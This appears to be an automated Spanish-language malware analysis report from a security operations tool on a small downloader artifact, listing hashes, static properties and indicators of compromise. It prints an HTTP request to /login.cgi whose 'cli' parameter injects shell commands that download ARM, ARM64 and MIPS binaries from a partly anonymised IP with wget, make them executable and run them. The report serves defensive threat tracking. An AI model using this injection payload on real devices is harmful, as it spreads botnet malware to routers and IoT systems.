# 🧬 Payload Analysis

`5a7f74e383063e05a8c97d64463e0925de77ec231c94815b66d52e20411e09c2`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:40:04+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `5a7f74e383063e05a8c97d64463e0925de77ec231c94815b66d52e20411e09c2`
- **MD5:** `4807a2cbb0a0e10a6d58f8a447dd3a9d`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (306), with CRLF line terminators |
| Tamaño | 368 B |
| Entropía | 5.02 |
| Strings | 4 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (306), with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /login.cgi?cli=aa%20aa%27;wget%20http://85.11.167.XXX/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7;wget%2
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 85.11.167.XXX | static_analysis |
| url | hxxp://85.11.167.XXX/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7;wget%20http://85.11.167.XXX/arm64%20-O%20/tmp/arm64;chmod%20777%20/tmp/arm64;/tmp/arm64;wget%20http://85.11.167.XXX/mips%20-O%20/tmp/mips;chmod%20777%20/tmp/mips;/tmp/mips%20dlink%27$ | strings |
| hash | 5a7f74e383063e05a8c97d64463e0925de77ec231c94815b66d52e20411e09c2 | static_analysis |
| command | GET /login.cgi?cli=aa%20aa%27;wget%20http://85.11.167.XXX/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7;wget%2 | strings |
| ip | 45.41.105.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
